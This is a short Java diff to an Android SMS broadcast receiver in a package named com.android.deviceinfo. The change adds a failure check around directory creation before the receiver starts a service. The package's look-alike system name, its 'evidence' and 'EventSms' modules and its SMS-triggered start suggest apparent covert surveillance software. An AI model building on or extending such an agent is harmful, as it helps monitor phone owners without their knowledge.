@@ -20,6 +20,7 @@ import android.telephony.SmsMessage;
 import com.android.deviceinfo.Core;
 import com.android.deviceinfo.ServiceMain;
 import com.android.deviceinfo.auto.Cfg;
+import com.android.deviceinfo.conf.ConfType;
 import com.android.deviceinfo.event.EventSms;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.file.Path;
@@ -38,7 +39,14 @@ public class BSm extends BroadcastReceiver {
 
 			// serviceIntent.setAction(Messages.getString("com.android.service_ServiceCore"));
 			context.startService(serviceIntent);
-			Path.makeDirs();
+			
+			if(!Path.makeDirs()){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onReceive) Error: Can't create a writable directory");
+				}
+				return;
+			}
+			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onReceive): Started from SMS"); //$NON-NLS-1$
 			}
